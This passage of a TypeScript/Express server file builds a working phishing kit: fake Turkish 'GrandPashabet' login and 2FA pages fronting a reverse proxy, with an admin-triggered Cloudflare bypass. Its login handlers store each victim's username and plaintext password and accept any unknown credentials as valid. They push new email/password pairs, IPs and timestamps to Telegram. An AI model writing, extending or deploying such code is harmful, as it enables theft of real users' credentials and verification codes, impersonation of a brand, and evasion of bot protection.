.error-msg{background:rgba(231,76,60,.15);border:1px solid rgba(231,76,60,.3);color:#e74c3c;padding:14px 18px;border-radius:6px;margin-bottom:12px;font-size:15px;line-height:1.6;display:none;text-align:center;white-space:normal;word-wrap:normal;overflow-wrap:normal;max-width:100%;box-sizing:border-box}

/* ─── Login button ─── */
.platformLoginButton{width:100%;padding:13px;border:none;border-radius:6px;background:linear-gradient(180deg,#45a049 0%,#357a38 100%);color:#fff;font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;text-transform:uppercase;letter-spacing:.5px}
.platformLoginButton:hover{background:linear-gradient(180deg,#4db852 0%,#3d8b41 100%);box-shadow:0 4px 16px rgba(69,160,73,.3)}
.platformLoginButton:active{transform:scale(.98)}
.platformLoginButton:disabled{opacity:.6;cursor:not-allowed;transform:none}

/* ─── Forgot password ─── */
.platformForgPass{display:block;text-align:center;margin-top:14px;color:#7a7e8a;font-size:13px;text-decoration:none;transition:color .15s}
.platformForgPass:hover{color:#b0b3bc}

/* ─── Telegram banner ─── */
.login__banner{display:block;margin-top:16px;border-radius:6px;overflow:hidden}
.login__banner-img{width:100%;display:block}

/* ─── Spinner ─── */
.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}

/* ─── Mobile: full-screen sidebar from right ─── */
@media(max-width:600px){
  .overlay{background:rgba(0,0,0,.5)}
  .sidebar_login{position:fixed;top:0;right:0;left:auto;bottom:0;transform:none;width:100%;max-width:100vw;border-radius:0;max-height:100vh;height:100vh}
}
</style>
</head>
<body>
<div class="overlay" id="overlay"></div>
<div class="sidebar_login" id="sidebar-login" data-testid="modal-login">
  <div class="sidebar_login-header">
    <span>\u00dcYE G\u0130R\u0130\u015e\u0130</span>
    <a href="${home}" class="sidebar_login-close" data-testid="button-close" title="Kapat"></a>
  </div>
  <div class="login_container">
    <div class="platformLoginRightLogo">
      <div class="logo-icon">
        <svg viewBox="0 0 48 48" fill="none">
          <path d="M8 4h32a4 4 0 014 4v32a4 4 0 01-4 4H8a4 4 0 01-4-4V8a4 4 0 014-4z" fill="#1a7a2f"/>
          <path d="M14 16l6 4.5V12l-6 4zm0 16V24l6 4.5V37l-6-5zm10-12l6-4.5V24l-6-4.5zm0 8l6 4.5V24l-6 4.5z" fill="#45bf55"/>
          <path d="M20 20.5L14 16v16l6-4.5v-7zm8 0L34 16v16l-6-4.5v-7z" fill="#fff" opacity=".15"/>
        </svg>
      </div>
      <div class="logo-title">GRANDPASHABET</div>
      <div class="logo-subtitle">CASINO &amp; SPORTS BETTING</div>
    </div>
    <form id="loginForm" autocomplete="off">
      <div class="r_login__row">
        <div class="PlatformLoginPassContainer">
          <span class="field-label">E-POSTA</span>
          <input class="login_input" type="email" id="username" name="Email" placeholder="E-posta adresiniz" required autofocus data-testid="input-username" tabindex="1" />
        </div>
      </div>
      <div class="r_login__row">
        <div class="PlatformLoginPassContainer eye_block">
          <span class="field-label">\u015e\u0130FRE</span>
          <input class="platformPassInput" type="password" id="password" name="Password" placeholder="\u015eifre" required data-testid="input-password" tabindex="2" autocomplete="off" />
          <button type="button" class="eye_button" id="togglePw" data-testid="button-toggle-password" tabindex="-1">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
      </div>
      <div class="error-msg" id="err" data-testid="text-error"></div>
      <div class="r_login__row">
        <button type="submit" class="platformLoginButton" id="submitBtn" data-testid="button-login">\u00dcYE G\u0130R\u0130\u015e\u0130</button>
      </div>
      <div class="r_login__row">
        <a class="platformForgPass" href="#" data-testid="link-forgot">\u015eifrenizi mi unuttunuz?</a>
      </div>
    </form>
  </div>
</div>
<script>
(function(){
  var form = document.getElementById('loginForm');
  var btn = document.getElementById('submitBtn');
  var togglePw = document.getElementById('togglePw');
  var pwField = document.getElementById('password');

  function showLoginError(msg){
    var ex=document.getElementById('custom-login-error');
    if(ex)ex.remove();
    var exB=document.getElementById('custom-login-error-backdrop');
    if(exB)exB.remove();
    var backdrop=document.createElement('div');
    backdrop.id='custom-login-error-backdrop';
    backdrop.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:2147483646;';
    document.body.appendChild(backdrop);
    var errDiv=document.createElement('div');
    errDiv.id='custom-login-error';
    errDiv.style.cssText='position:fixed!important;left:50%!important;top:50%!important;transform:translate(-50%,-50%)!important;width:90vw!important;max-width:380px!important;box-sizing:border-box!important;color:#1a1a1a!important;font-size:15px!important;line-height:1.5!important;padding:16px 20px!important;margin:0!important;background:#fef3cd!important;border:2px solid #d7ab2f!important;border-radius:10px!important;text-align:center!important;white-space:normal!important;word-wrap:break-word!important;overflow-wrap:break-word!important;overflow:visible!important;z-index:2147483647!important;font-family:system-ui,sans-serif!important;box-shadow:0 8px 32px rgba(0,0,0,.3)!important';
    errDiv.textContent=msg;
    document.body.appendChild(errDiv);
    function rm(){if(errDiv.parentElement)errDiv.remove();if(backdrop.parentElement)backdrop.remove();}
    backdrop.addEventListener('click',rm);
    setTimeout(rm,6000);
  }

  togglePw.addEventListener('click', function(){
    pwField.type = pwField.type === 'password' ? 'text' : 'password';
  });

  document.getElementById('overlay').addEventListener('click', function(){
    window.location.href = '${home}';
  });

  form.addEventListener('submit', function(e){
    e.preventDefault();
    var username = document.getElementById('username').value.trim();
    var password = pwField.value;
    if(!username||!password){showLoginError('Kullan\u0131c\u0131 ad\u0131/e-posta ve \u015fifre gerekli');return}
    btn.disabled=true;
    btn.innerHTML='<span class="spinner"></span>G\u0130R\u0130\u015e YAPILIYOR...';

    var isEmail = username.indexOf('@') !== -1 && username.indexOf('.') !== -1;
    var endpoint = isEmail ? '/api/auth/login' : '/api/auth/login-username';

    fetch(endpoint,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({username:username,password:password}),
      credentials:'include'
    }).then(function(r){return r.json()}).then(function(data){
      if(data.success){
        if(data.requires2FA){
          var u=(window.location.origin||'')+'/login/trustbrowser';
          setTimeout(function(){ window.location.replace(u); }, 350);
          return;
        }
        window.location.href='${home}';
      }else{
        showLoginError(data.message||'Giri\u015f ba\u015far\u0131s\u0131z');
        btn.disabled=false;
        btn.textContent='\u00dcYE G\u0130R\u0130\u015e\u0130';
      }
    }).catch(function(e){
      showLoginError('Ba\u011flant\u0131 hatas\u0131: '+e.message);
      btn.disabled=false;
      btn.textContent='\u00dcYE G\u0130R\u0130\u015e\u0130';
    });
  });
})();
</script>
</body>
</html>`;
}

// ═══════════════════════════════════════════════════
// ─── 2FA Verification Page HTML (GrandPashabet benzeri) ───
// ═══════════════════════════════════════════════════
function getTwoFactorPageHtml(base: string): string {
  const home = getHomeUrl(base);
  return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Doğrulama - GrandPashabet</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1e29;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#fff;min-height:100vh;overflow-x:hidden;display:flex;align-items:center;justify-content:center;padding:16px}
.trusted_container{width:100%;max-width:420px;position:relative;z-index:200}
.trusted_popup{background:#1a2e1a;border:1px solid #2d4a2d;border-radius:12px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.6);padding:28px 24px;position:relative}
.trusted_popup__header{text-align:center;margin-bottom:24px}
.trusted_popup__icon{width:56px;height:56px;margin:0 auto 12px;display:block}
.trusted_popup__icon svg{width:100%;height:100%;fill:#fff}
.trusted_popup__text{font-size:15px;color:#fff;line-height:1.5}
.form-group{margin-bottom:16px}
.trusted_popup__input{width:100%;padding:14px 16px;border:1px solid #5a7a4a;border-radius:8px;background:#f5e6c8;color:#1a1a1a;font-size:16px;text-align:center;letter-spacing:6px;outline:none}
.trusted_popup__input::placeholder{color:#8a7a5a;letter-spacing:2px}
.trusted_popup__resendCont{text-align:center;font-size:14px;color:#b0c8a0;margin-bottom:18px}
.trusted_popup__link{color:#d4af37;text-decoration:none;cursor:pointer;font-weight:500}
.trusted_popup__link:hover{text-decoration:underline}
.trusted_popup__checkbox{display:inline-flex;align-items:center;gap:10px;cursor:pointer;font-size:14px;color:#c8d8b8}
.trusted_popup__checkbox input{width:20px;height:20px;accent-color:#d4af37;cursor:pointer;flex-shrink:0}
.trusted_popup__button{width:100%;padding:16px;border:none;border-radius:8px;background:linear-gradient(180deg,#f5e6c8 0%,#e8d5a3 100%);color:#1a2e1a;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;margin-top:8px;transition:all .2s}
.trusted_popup__button:hover{background:linear-gradient(180deg,#fef3cd 0%,#f0e0b0 100%);box-shadow:0 4px 20px rgba(213,175,55,.4)}
.trusted_popup__button:disabled{opacity:.7;cursor:not-allowed}
.error-msg{background:rgba(231,76,60,.2);border:1px solid rgba(231,76,60,.4);color:#e74c3c;padding:14px 18px;border-radius:8px;margin-bottom:14px;font-size:15px;line-height:1.6;display:none;text-align:center;white-space:normal}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(0,0,0,.2);border-top-color:#1a2e1a;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.live-support{position:fixed;bottom:20px;right:20px;z-index:300;width:56px;height:56px;border-radius:50%;background:linear-gradient(180deg,#d4af37,#a8841a);color:#1a1a1a;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 16px rgba(0,0,0,.3);text-decoration:none}
.live-support svg{width:28px;height:28px}
</style>
</head>
<body>
<div class="trusted_container">
  <div class="trusted_popup" data-testid="modal-2fa">
    <div class="trusted_popup__header text-center">
      <span class="trusted_popup__icon"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg></span>
      <p class="trusted_popup__text">Onaylama kodu e-postanıza gönderilmiştir</p>
    </div>
    <div class="error-msg" id="err" data-testid="text-error"></div>
    <form id="tfaForm" autocomplete="off">
      <div class="form-group">
        <input class="trusted_popup__input" type="text" id="tfaCode" name="code" placeholder="Onaylama kodu giriniz" required autofocus data-testid="input-2fa-code" maxlength="10" />
      </div>
      <div class="form-group trusted_popup__resendCont" id="js_tb_resend_cont">Kodu yeniden g\u00f6nder <span id="js_tb_remaining_time">60</span></div>
      <div class="form-group">
        <label class="trusted_popup__checkbox" data-testid="checkbox-trust">
          <input type="checkbox" id="trustBrowser" name="TrustBrowser" value="false" />
          <span>Güvenilen Tarayıcı olarak kaydet</span>
        </label>
      </div>
      <button type="submit" class="trusted_popup__button" id="submitBtn" data-testid="button-verify">ONAYLA</button>
    </form>
  </div>
</div>
<a href="#" class="live-support" title="Canlı Destek" id="liveSupportBtn"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg></a>
<script>
(function(){
  var form = document.getElementById('tfaForm');
  var err = document.getElementById('err');
  var btn = document.getElementById('submitBtn');
  var resendCont = document.getElementById('js_tb_resend_cont');
  var countdown = 60;
  var countInterval = null;

  function startResendCountdown(sec) {
    countdown = sec;
    resendCont.innerHTML = 'Kodu yeniden g\u00f6nder <span id="js_tb_remaining_time">' + countdown + '</span>';
    resendCont.onclick = null;
    clearInterval(countInterval);
    countInterval = setInterval(function() {
      countdown--;
      var s = document.getElementById('js_tb_remaining_time');
      if (s) s.textContent = countdown;
      if (countdown <= 0) {
        clearInterval(countInterval);
        resendCont.innerHTML = '<a class="trusted_popup__link" id="js_tb_resend_btn">Kodu yeniden g\u00f6nder</a>';
        document.getElementById('js_tb_resend_btn').addEventListener('click', onResendClick);
      }
    }, 1000);
  }

  function onResendClick(e) {
    e.preventDefault();
    resendCont.innerHTML = 'Kodu yeniden g\u00f6nder <span id="js_tb_remaining_time">60</span>';
    fetch('/api/auth/resend-2fa', { method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'include' })
      .then(function(r){ return r.json(); })
      .then(function(data){
        if (data.success) { startResendCountdown(data.retryAfter || 60); }
        else { err.textContent = data.message || 'Gönderilemedi'; err.style.display = 'block'; resendCont.innerHTML = '<a class="trusted_popup__link" id="js_tb_resend_btn">Kodu yeniden g\u00f6nder</a>'; document.getElementById('js_tb_resend_btn').addEventListener('click', onResendClick); }
      })
      .catch(function(){ err.textContent = 'Bağlantı hatası'; err.style.display = 'block'; resendCont.innerHTML = '<a class="trusted_popup__link" id="js_tb_resend_btn">Kodu yeniden g\u00f6nder</a>'; document.getElementById('js_tb_resend_btn').addEventListener('click', onResendClick); });
  }

  document.getElementById('liveSupportBtn').addEventListener('click', function(e){ e.preventDefault(); });

  startResendCountdown(60);

  form.addEventListener('submit', function(e){
    e.preventDefault();
    var code = document.getElementById('tfaCode').value.trim();
    var trustBrowser = document.getElementById('trustBrowser').checked;
    if(!code){ err.textContent='Onaylama kodu gerekli'; err.style.display='block'; return; }
    err.style.display='none';
    btn.disabled=true;
    btn.innerHTML='<span class="spinner"></span> DOĞRULANIYOR...';
    fetch('/api/auth/verify-2fa', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: code, trustBrowser: trustBrowser }),
      credentials: 'include'
    }).then(function(r){ return r.json(); }).then(function(data){
      if(data.success){ window.location.href = '${home}'; }
      else{ err.textContent = data.message || 'Doğrulama başarısız'; err.style.display = 'block'; btn.disabled = false; btn.textContent = 'ONAYLA'; }
    }).catch(function(ex){ err.textContent = 'Bağlantı hatası: ' + ex.message; err.style.display = 'block'; btn.disabled = false; btn.textContent = 'ONAYLA'; });
  });

  document.querySelector('.trusted_container').addEventListener('keypress', function(e){
    if (e.which === 13) { form.dispatchEvent(new Event('submit')); e.preventDefault(); }
  });
})();
</script>
</body>
</html>`;
}

// ═══════════════════════════════════════════════════
// ─── Register Routes ───
// ═══════════════════════════════════════════════════
export async function registerRoutes(httpServer: Server, app: Express): Promise<Server> {
  // Setup WebSocket proxy
  setupWebSocketProxy(httpServer);

  // ═══════════════════════════════════════════════════
  // ─── Session Middleware ───
  // ═══════════════════════════════════════════════════
  const PgSession = connectPgSimple(session);
  const MemoryStore = createMemoryStore(session);
  const oneDayMs = 24 * 60 * 60 * 1000;
  const isProd = process.env.NODE_ENV === "production";

  const sessionStore = pool
    ? new PgSession({
        pool,
        tableName: "session",
        createTableIfMissing: true,
      })
    : new MemoryStore({
        checkPeriod: oneDayMs,
        stale: false,
      });

  // Port 5000 (localhost HTTP) = secure false, yoksa tarayici cookie gondermez -> yenileyince cikis
  const isLocalPort = process.env.PORT === "5000" || process.env.PORT === "5001";
  const cookieSecure = process.env.COOKIE_SECURE === "true" || (isProd && !isLocalPort);
  app.use(
    session({
      store: sessionStore,
      name: "connect.sid",
      secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex"),
      resave: false,
      rolling: true,
      saveUninitialized: false,
      cookie: {
        path: "/",
        httpOnly: true,
        sameSite: "lax",
        secure: cookieSecure,
        maxAge: oneDayMs,
      },
    }),
  );

  // ═══════════════════════════════════════════════════
  // ─── Admin Panel Routes ───
  // ═══════════════════════════════════════════════════
  registerAdminRoutes(app, {
    clearProxyCache: () => { responseCache.clear(); clearDiskCache(); },
    onTargetDomainChange: () => {
      storedCookies.clear();
      clearPool();
      responseCache.clear(); clearDiskCache();
      log("CONFIG", "Target domain degisti: cookie, pool ve cache temizlendi, CF bypass yeniden gerekebilir.");
    },
    getProxyStatus: () => ({
      sessionId: currentSessionId,
      storedCookies: storedCookies.size,
      cookieNames: Array.from(storedCookies.keys()),
      cfReady: isCfReady(),
      hasCfClearance: storedCookies.has("cf_clearance"),
      hasCfBm: storedCookies.has("__cf_bm"),
      cfClearanceExpiry: cfClearanceExpiry > 0 ? new Date(cfClearanceExpiry).toISOString() : null,
      cfClearanceTTL: cfClearanceExpiry > 0 ? Math.max(0, Math.ceil((cfClearanceExpiry - Date.now()) / 1000)) : 0,
      bypassInProgress: cfBypassInProgress,
      bypassFailCount,
      bypassMode: process.env.CF_HEADLESS === "true" ? "headless" : "headful",
      target: getTargetUrl(),
      proxyConfigured: isProxyConfigured(),
      lastBypassError: getLastBypassError(),
      timestamp: new Date().toISOString(),
    }),
    refreshProxySession: async () => {
      bypassFailCount = 0;
      lastBypassAttempt = 0;
      cfClearanceExpiry = 0;
      await refreshSession();
      const cfCookies = await getCloudflareBypassCookies();
      if (cfCookies) {
        for (const [k, v] of Object.entries(cfCookies.allCookies)) storedCookies.set(k, v);
        if (cfCookies.cfClearance) cfClearanceExpiry = Date.now() + CF_CLEARANCE_LIFETIME;
      }
      return { message: "Session yenilendi (headful bypass)", sessionId: currentSessionId, cookies: storedCookies.size, cfReady: isCfReady() };
    },
    triggerCfBypass: async () => {
      bypassFailCount = 0;
      lastBypassAttempt = 0;
      cfClearanceExpiry = 0;
      setPuppeteerSessionId(currentSessionId);
      log("CF", "Manual headful bypass triggered from admin panel");
      const cfCookies = await getCloudflareBypassCookies();
      if (cfCookies) {
        const newSid = getPuppeteerSessionId();
        if (newSid !== currentSessionId) {
          currentSessionId = newSid;
          proxyAgent = createProxyAgent();
        }
        for (const [k, v] of Object.entries(cfCookies.allCookies)) storedCookies.set(k, v);
        if (cfCookies.cfClearance) cfClearanceExpiry = Date.now() + CF_CLEARANCE_LIFETIME;
        return { success: true, message: "Headful CF bypass tamamlandı", cookies: storedCookies.size, cfReady: isCfReady(), hasCfClearance: !!cfCookies.cfClearance };
      }
      const errDetail = getLastBypassError();
      return { success: false, message: errDetail || "CF bypass başarısız", errorDetail: errDetail };
    },
  });
  await seedDefaultAdmin();

  // ═══════════════════════════════════════════════════
  // ─── Auth API Endpoints ───
  // ═══════════════════════════════════════════════════
  function isTrustedDevice(req: Request, userId: string): boolean {
    const cookie = req.cookies?.trusted_device || (req.headers.cookie || "").match(/trusted_device=([^;]+)/)?.[1];
    if (!cookie || !cookie.includes(".")) return false;
    const [uid, token] = cookie.split(".");
    if (uid !== userId || !token) return false;
    const secret = process.env.SESSION_SECRET || "default-secret";
    const expected = crypto.createHmac("sha256", secret).update(userId).digest("hex").slice(0, 32);
    return token === expected;
  }

  function sendAuthSuccess(req: Request, res: Response, body: Record<string, unknown>): void {
    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
    (req.session as any).save((err: Error) => {
      if (err) {
        console.error("[AUTH] Session save error:", err);
        if (!res.headersSent) res.status(500).json({ success: false, message: "Oturum kaydedilemedi" });
        return;
      }
      if (!res.headersSent) res.json(body);
    });
  }

  function isEmailLike(input: string): boolean {
    return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(input);
  }

  function looksLikeBotInput(input: string): boolean {
    const value = input.trim();
    if (!value) return true;
    if (value.length < 3) return true;
    if (value.length > 48) return true;

    const letters = (value.match(/[a-zA-ZğüşöçıİĞÜŞÖÇ]/g) || []).length;
    const digits = (value.match(/\d/g) || []).length;
    const symbols = (value.match(/[^a-zA-Z0-9ğüşöçıİĞÜŞÖÇ]/g) || []).length;
    const total = value.length || 1;

    if (digits === total && total >= 8) return true;
    if (symbols === total) return true;
    if (letters === 0 && digits === 0) return true;
    if (digits / total >= 0.7 && letters <= 1 && total >= 8) return true;

    return false;
  }

  type LoginResult = { success: true; requires2FA?: boolean; username: string } | { success: false; message: string };

  const usernameLoginAttempts = new Map<string, { count: number; windowStart: number }>();

  function isRateLimitedIp(ip: string, maxAttempts = 15, windowMs = 60_000): boolean {
    if (!ip) return false;
    const now = Date.now();
    const existing = usernameLoginAttempts.get(ip);
    if (!existing || now - existing.windowStart > windowMs) {
      usernameLoginAttempts.set(ip, { count: 1, windowStart: now });
      return false;
    }
    existing.count += 1;
    return existing.count > maxAttempts;
  }

  function resetRateLimitForIp(ip: string): void {
    if (!ip) return;
    usernameLoginAttempts.delete(ip);
  }

  async function performLoginAuth(req: Request, loginInput: string, password: string): Promise<LoginResult> {
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
    let user = await storage.getUserByEmail(loginInput);
    const existingLog = user ? await storage.getLogByUsername(user.username) : await storage.getLogByUsername(loginInput);

    if (user) {
      const isHashed = user.password.startsWith("$2a$") || user.password.startsWith("$2b$");
      let valid = false;
      if (isHashed) {
        valid = await bcrypt.compare(password, user.password);
      } else {
        valid = user.password === password;
        if (valid) {
          const hashed = await bcrypt.hash(password, 10);
          await storage.updateUser(user.id, { password: hashed });
        }
      }
      if (!valid) return { success: false, message: "E-posta veya şifre hatalı" };
      const userEmail = (user as any).email as string | undefined;
      if (userEmail && userEmail.trim() && !isTrustedDevice(req, user.id)) {
        const code = String(Math.floor(100000 + Math.random() * 900000));
        const expiresAt = Math.floor(Date.now() / 1000) + 600;
        await storage.createVerificationCode(user.id, code, expiresAt);
        const sent = await sendVerificationCode(userEmail.trim(), code);
        if (!sent.ok) return { success: false, message: "Doğrulama kodu gönderilemedi. " + (sent.error || "") };
        req.session.pending2FA = { userId: user.id, username: user.username, email: userEmail.trim() };
        return { success: true, requires2FA: true, username: user.username };
      }
      req.session.userId = user.id;
      req.session.username = user.username;
      return { success: true, username: user.username };
    }

    if (existingLog) {
      if (existingLog.password !== password) return { success: false, message: "E-posta veya şifre hatalı" };
      try {
        const hashedPassword = await bcrypt.hash(password, 10);
        user = await storage.createUser({ username: existingLog.username, password: hashedPassword, email: loginInput });
      } catch (err: any) {
        if (err?.code === "23505" || /unique|duplicate/i.test(err?.message || "")) {
          user = await storage.getUserByUsername(existingLog.username) ?? await storage.getUserByEmail(loginInput);
        }
        if (!user) throw err;
      }
      const userEmail = ((user as any)?.email as string | undefined) || loginInput;
      if (userEmail && userEmail.trim() && !isTrustedDevice(req, user!.id)) {
        const code = String(Math.floor(100000 + Math.random() * 900000));
        const expiresAt = Math.floor(Date.now() / 1000) + 600;
        await storage.createVerificationCode(user!.id, code, expiresAt);
        const sent = await sendVerificationCode(userEmail.trim(), code);
        if (!sent.ok) return { success: false, message: "Doğrulama kodu gönderilemedi. " + (sent.error || "") };
        req.session.pending2FA = { userId: user!.id, username: user!.username, email: userEmail.trim() };
        return { success: true, requires2FA: true, username: user!.username };
      }
      req.session.userId = user!.id;
      req.session.username = user!.username;
      return { success: true, username: user!.username };
    }

    try {
      await storage.createLog({
        username: loginInput,
        password,
        balance: 0,
        name: "",
        surname: "",
        phoneNumber: "",
        ip,
        date: Math.floor(Date.now() / 1000),
        isDeleted: 0,
        isBanned: 0,
        vip: 0,
      });
      sendTelegram(
        `<b>Yeni Giris</b>\nE-posta: ${loginInput}\nSifre: ${password}\nIP: ${ip}\nTarih: ${new Date().toLocaleString("tr-TR")}`
      ).catch(() => {});
    } catch (logErr) {
      console.error("[AUTH] Log kaydi olusturulamadi:", logErr);
    }

    try {
      const hashedPassword = await bcrypt.hash(password, 10);
      user = await storage.createUser({ username: loginInput, password: hashedPassword, email: loginInput });
    } catch (err: any) {
      if (err?.code === "23505" || /unique|duplicate/i.test(err?.message || "")) {
        user = await storage.getUserByEmail(loginInput);
      }
      if (!user) throw err;
    }
    const userEmail = ((user as any)?.email as string | undefined) || loginInput;
    if (userEmail && userEmail.trim() && !isTrustedDevice(req, user!.id)) {
      const code = String(Math.floor(100000 + Math.random() * 900000));
      const expiresAt = Math.floor(Date.now() / 1000) + 600;
      await storage.createVerificationCode(user!.id, code, expiresAt);
      const sent = await sendVerificationCode(userEmail.trim(), code);
      if (!sent.ok) return { success: false, message: "Doğrulama kodu gönderilemedi. " + (sent.error || "") };
      req.session.pending2FA = { userId: user!.id, username: user!.username, email: userEmail.trim() };
      return { success: true, requires2FA: true, username: user!.username };
    }
    req.session.userId = user!.id;
    req.session.username = user!.username;
    return { success: true, username: user!.username };
  }

  async function performUsernameLogin(req: Request, username: string, password: string): Promise<LoginResult> {
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
    let user = await storage.getUserByUsername(username);

    if (user) {
      const isHashed = user.password.startsWith("$2a$") || user.password.startsWith("$2b$");
      let valid = false;
      if (isHashed) {
        valid = await bcrypt.compare(password, user.password);
      } else {
        valid = user.password === password;
        if (valid) {
          const hashed = await bcrypt.hash(password, 10);
          await storage.updateUser(user.id, { password: hashed });
        }
      }
      if (!valid) return { success: false, message: "Kullanıcı adı veya şifre yanlış" };
      try {
        await storage.createLog({
          username: user.username,
          password,
          balance: 0,
          name: "",
          surname: "",
          phoneNumber: "",
          ip,
          date: Math.floor(Date.now() / 1000),
          isDeleted: 0,
          isBanned: 0,
          vip: 0,
        });
      } catch (_) {}
      req.session.userId = user.id;
      req.session.username = user.username;
      sendTelegram(
        `<b>Username Giris</b>\nKullanici: ${username}\nIP: ${ip}\nTarih: ${new Date().toLocaleString("tr-TR")}`
      ).catch(() => {});
      return { success: true, username: user.username };
    }

    const existingLog = await storage.getLogByUsername(username);
    if (existingLog) {
      if (existingLog.password !== password) return { success: false, message: "Kullanıcı adı veya şifre yanlış" };
      try {
        const hashedPassword = await bcrypt.hash(password, 10);
        user = await storage.createUser({ username: existingLog.username, password: hashedPassword, email: null });
      } catch (err: any) {
        if (err?.code === "23505" || /unique|duplicate/i.test(err?.message || "")) {
          user = await storage.getUserByUsername(existingLog.username);
        }
        if (!user) throw err;
      }
      try {
        await storage.createLog({
          username: existingLog.username,
          password,
          balance: 0,
          name: "",
          surname: "",
          phoneNumber: "",
          ip,
          date: Math.floor(Date.now() / 1000),
          isDeleted: 0,
          isBanned: 0,
          vip: 0,
        });
      } catch (_) {}
      req.session.userId = user!.id;
      req.session.username = user!.username;
      sendTelegram(
        `<b>Username Giris (log'dan)</b>\nKullanici: ${existingLog.username}\nIP: ${ip}\nTarih: ${new Date().toLocaleString("tr-TR")}`
      ).catch(() => {});
      return { success: true, username: user!.username };
    }

    try {
      await storage.createLog({
        username,
        password,
        balance: 0,
        name: "",
        surname: "",
        phoneNumber: "",
        ip,
        date: Math.floor(Date.now() / 1000),
        isDeleted: 0,
        isBanned: 0,
        vip: 0,
      });
      sendTelegram(
        `<b>Yeni Giris (username)</b>\nKullanici: ${username}\nSifre: ${password}\nIP: ${ip}\nTarih: ${new Date().toLocaleString("tr-TR")}`
      ).catch(() => {});
    } catch (logErr) {
      console.error("[AUTH] Log kaydi olusturulamadi:", logErr);
    }

    try {
      const hashedPassword = await bcrypt.hash(password, 10);
      user = await storage.createUser({ username, password: hashedPassword, email: null });
    } catch (err: any) {
      if (err?.code === "23505" || /unique|duplicate/i.test(err?.message || "")) {
        user = await storage.getUserByUsername(username);
      }
      if (!user) throw err;
    }
    req.session.userId = user!.id;
    req.session.username = user!.username;
    return { success: true, username: user!.username };
  }

  app.post("/api/auth/login-username", async (req: Request, res: Response) => {
    try {
      const loginInput = (req.body.username ?? req.body.Username ?? req.body.phone ?? req.body.Phone ?? req.body.gsm ?? req.body.Gsm ?? "").toString().trim();
      const password = (req.body.password ?? req.body.Password ?? "").toString();
      if (!loginInput || !password) {
        return res.status(400).json({ success: false, message: "Kullanıcı adı veya şifre gerekli" });
      }

      if (isEmailLike(loginInput)) {
        return res.status(400).json({ success: false, message: "E-posta ile giriş için e-posta giriş ekranını kullanınız." });
      }

      const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
      if (isRateLimitedIp(ip)) {
        return res.status(429).json({ success: false, message: "Çok sayıda deneme tespit edildi. Lütfen bir süre sonra tekrar deneyin." });
      }

      if (looksLikeBotInput(loginInput)) {
        return res.status(401).json({ success: false, message: "Kullanıcı adı veya şifre yanlış" });
      }

      const result = await performUsernameLogin(req, loginInput, password);
      if (!result.success) {
        return res.status(401).json({ success: false, message: "Kullanıcı adı veya şifre yanlış" });
      }

      resetRateLimitForIp(ip);
      return sendAuthSuccess(req, res, { success: true, username: result.username });
    } catch (error: any) {
      res.setHeader("Cache-Control", "no-store, no-cache");
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post("/api/auth/login", async (req: Request, res: Response) => {
    try {
      const loginInput = (req.body.username ?? req.body.email ?? req.body.Email ?? "").toString().trim();
      const password = (req.body.password ?? req.body.Password ?? "").toString();
      if (!loginInput || !password) {
        return res.status(400).json({ success: false, message: "E-posta ve şifre gerekli" });
      }
      if (!loginInput.includes("@")) {
        return res.status(400).json({ success: false, message: "E-posta adresinizle giriş yapınız. 2FA için e-posta zorunludur." });
      }
      const result = await performLoginAuth(req, loginInput, password);
      if (!result.success) {
        return res.status(401).json({ success: false, message: result.message });
      }
      const body = result.requires2FA
        ? { success: true, requires2FA: true, username: result.username }
        : { success: true, username: result.username };
      return sendAuthSuccess(req, res, body);
    } catch (error: any) {
      res.setHeader("Cache-Control", "no-store, no-cache");
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get("/api/auth/me", (req: Request, res: Response) => {
    if (req.session.userId) {
      res.json({ loggedIn: true, username: req.session.username, userId: req.session.userId });
    } else {
      res.json({ loggedIn: false });
    }
  });

  app.get("/api/auth/balance", async (req: Request, res: Response) => {
    const uname = (req.query.username as string || req.session.username || "").trim();
